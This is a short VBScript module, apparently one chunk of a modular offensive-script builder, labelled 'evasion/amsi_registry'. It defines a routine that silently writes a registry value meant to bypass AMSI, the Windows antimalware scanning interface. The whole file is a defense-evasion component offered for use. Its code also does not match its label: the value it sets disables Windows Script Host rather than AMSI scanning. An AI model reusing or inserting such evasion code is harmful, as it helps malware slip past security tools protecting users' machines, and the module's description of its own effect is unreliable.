' chunk: evasion/amsi_registry
' depends: (none)
' provides: bypass_amsi
' format: vbscript
' note: AMSI bypass via WSH Settings registry disable

Sub bypass_amsi()
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.RegWrite "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD"
End Sub
